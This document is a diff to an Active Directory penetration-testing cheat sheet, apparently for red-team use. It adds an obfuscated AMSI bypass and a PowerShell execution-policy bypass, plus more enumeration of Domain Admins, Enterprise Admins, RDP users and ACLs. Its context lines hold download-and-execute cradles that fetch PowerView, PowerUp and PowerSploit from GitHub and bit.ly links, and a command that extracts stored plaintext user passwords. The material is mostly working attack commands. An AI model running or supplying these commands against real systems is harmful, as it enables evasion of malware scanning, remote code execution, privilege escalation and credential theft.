@@ -12,6 +12,12 @@ has_children: true
 ## PRE-REQUISITE: Installing PowerView, PowerUp and PowerSploit
 
 ```powershell
+# Bypass powershell execution protection
+powershell -ep bypass
+
+# Bypass AMSI: 
+sET-ItEM ( &apos;V&apos;+&apos;aR&apos; +  &apos;IA&apos; + &apos;blE:1q2&apos;  + &apos;uZx&apos;  ) ( [TYpE](  "{1}{0}"-F&apos;F&apos;,&apos;rE&apos;  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f&apos;Util&apos;,&apos;A&apos;,&apos;Amsi&apos;,&apos;.Management.&apos;,&apos;utomation.&apos;,&apos;s&apos;,&apos;System&apos;  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f&apos;amsi&apos;,&apos;d&apos;,&apos;InitFaile&apos;  ),(  "{2}{4}{0}{1}{3}" -f &apos;Stat&apos;,&apos;i&apos;,&apos;NonPubli&apos;,&apos;c&apos;,&apos;c,&apos;  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
 # ActiveDirectory Module
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 
@@ -23,7 +29,6 @@ iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\Powe
 
 # PowerSploit Module
 iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1
-
 ```
 
 ## ENUM : DOMAIN ADMIN
@@ -34,6 +39,7 @@ Invoke-UserHunter -CheckAccess
 
 # get all the effective members of DA groups, 'recursing down'
 Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse
 ```
 
 ## ENUM : PRIVILEGED USERS
@@ -44,8 +50,11 @@ Find-LocalAdminAccess
 # find local admins on all computers of the domain
 Invoke-EnumerateLocalAdmin
 
-# get all the effective members of BO groups, 'recursing down'
+# gather info on security groups
+Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
 Get-DomainGroupMember -Identity "Backup Operators" -Recurse
+Get-NetGroupMember -GroupName RDPUsers
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"} 
 
 # get actively logged users on a computer
 Get-NetLoggedon -ComputerName <Computer>
@@ -58,6 +67,7 @@ Get-LastLoggedon -ComputerName <Computer>
 
 # find users who have local admin rights
 Find-GPOComputerAdmin -ComputerName <computer>
+Get-NetOU Admins | %{Get-NetComputer -ADSPath $_}
 
 # find users who have local admin rights
 Find-GPOLocation -UserName <DA>
@@ -318,5 +328,5 @@ Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
 
 # check if any user passwords are set
 $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
-# 
+
 ```
